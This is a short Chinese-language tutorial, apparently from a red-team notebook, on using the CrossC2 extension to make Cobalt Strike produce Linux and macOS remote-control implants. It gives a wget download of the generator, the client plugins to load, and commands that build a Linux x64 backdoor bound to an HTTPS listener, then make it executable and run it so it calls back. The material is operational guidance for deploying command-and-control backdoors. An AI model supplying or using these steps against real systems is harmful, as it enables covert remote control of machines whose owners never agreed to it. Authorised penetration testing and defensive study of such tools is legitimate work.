## **Cross C2扩展**
Cobalt Strike 默认不支持 linux MacOS 的远控
Cross C2是一个支持Linux & MacOS系统的拓展插件，支持用户自定义生成的动态库，以无文件落地的方式从内存中加载执行动态库或可执行文件
生成.out等类型的linux可执行文件payload，不过监听器类型仅支持反弹https和正向bind。

^
下载加载器
CS服务端是Linux则下载genCrossC2.Linux，上传到CobaltStrike服务端目录下。
```
wget https://github.com/gloxec/CrossC2/releases/download/v3.1.0/genCrossC2.Linux
```
下载CS客户端扩展插件
CrossC2-GithubBot-2022-06-07.cna
CrossC2Kit.cna
CrossC2Kit Loader.cna

^
使用：
将CobaltStrike服务端的.cobaltstrike.beaconkeys下载到CobaltStrike客户端目录下。
客户端创建一个https监听器8087
客户端点击cross插件创建一个https监听器绑定一般https监听器
会生成命令
CS服务端执行生成linux后门绑定监听器端口命令
```
./genCrossC2.Linux 监听的IP 监听的端口 null null Linux x64 test

chmod +x test
./test   即可上线

 ./genCrossC2.Linux 192.168.130.19 443 .cobaltstrike.beacon_keys null Linux x64 test
```



^
更多：
文章：<https://www.cnblogs.com/bktown/p/16902827.html>
